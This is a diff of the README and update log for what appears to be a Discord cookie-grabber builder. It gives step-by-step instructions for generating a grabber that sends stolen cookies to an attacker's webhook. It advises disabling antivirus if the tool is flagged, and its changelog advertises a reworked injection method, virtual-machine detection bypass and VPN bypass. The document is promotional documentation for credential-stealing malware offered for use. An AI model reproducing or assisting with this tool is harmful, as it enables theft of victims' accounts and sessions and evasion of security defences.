@@ -1,4 +1,13 @@
 # Update Log
+[04/10/2023]
+- Made loading speed up to 50% faster.
+- Fixed bug where discord would crash or computer would bluescreen (Due to overload with discord API).
+- Updated the logo to a better looking one :eyes:
+- Completely recreated the injection method.
+- Various bug fixes for improvement.
+- Added support to bypass virtual machine blocking.
+- VPN Bypass.
+
 [12/19/2022]
 - Added support for slower devices.
 - Fixed bug where setup would get stuck for 30 seconds or more.
@@ -28,7 +37,7 @@ It **shouldn't** be flagged by your antivirus but if it is just disable it.
 
 How to use 
 1. Run main.exe
-2. Wait about 10 seconds while it loads all of the requirements in.
+2. Wait about 5-10 seconds while it loads all of the requirements in.
 3. Put in the name of your grabber.
 4. Put in the webhook from the channel you want to receive cookies from.
 5. When it is complete check the same directory as the setup for a grabber python script that you can convert to exe.
